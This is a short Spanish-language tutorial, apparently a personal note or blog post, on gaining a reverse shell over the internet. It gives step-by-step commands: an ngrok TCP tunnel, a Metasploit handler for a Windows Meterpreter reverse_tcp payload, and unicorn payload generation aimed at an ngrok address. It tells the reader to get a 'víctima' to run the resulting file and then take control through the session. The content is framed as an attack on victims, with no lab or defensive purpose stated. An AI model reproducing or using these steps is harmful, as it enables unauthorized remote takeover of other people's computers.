una shell inversa en un metodo en el cual una victima ejecuta una archivo en el cual hay un codigo malicioso este se conecta a el atacante abriendo una shell en la cual podemos tener control total del sistema manejarlo anuestro antojo la shell que haremos hoy sera una
shell inversa y fuera de lan una shell inversa significa que nosotros no nos conectamos a la victima la victima se conecta a nosotros y fuera de lan signinfica que va a ser fuera de nuestra red socila osea que la victimapuede estar desde cualquier parte del mundo y nosotros vamos a seguir teniendo el control del sistema esto tambien se aplica en telefonos android y ios asi que empesemos con este tutorial de shell inversa 

	1. descargamos ngrok
	2. hacemos un tunel tcp seguro con ngrok ./ngrok tcp 445 "el puerto puede cambiar"
	3. iniciamos metasploit con el conmando msfconsole
		msf> use exploit/multi/handler
		>set PAYLOAD windows/meterpreter/reverse_tcp
		>set LHOST 127.0.0.1
		>set LPORT 445
		>exploit -j	
	
	5. tambien lo podemos hacer con unicorn 
		>git clone https://github.com/trustedsec/unicorn
		>cd unicorn
		>python unicorn.py windows/meterpreter/reverse_tcp 0.tcp.ngrok.io 10100 "esto ultimo lo cambiamos por la dreccion que ngrok nos haya asignado"
		>el archivo que nos da lo ponemos en la maquina victima y hacemos que lo ejecute
		>una ves hecho nos metemos a la terminal con metasploit
	
	6. en la terminal de metasploit le ponemos sessions 
		>sessions -i 1 "estoo porque nuestra sesion es la numero 1"
		>listo ya podemos ejecutar comandos de todo tipo

	"CON ESTO FINALISAMOS ESTE TUTORIAL"
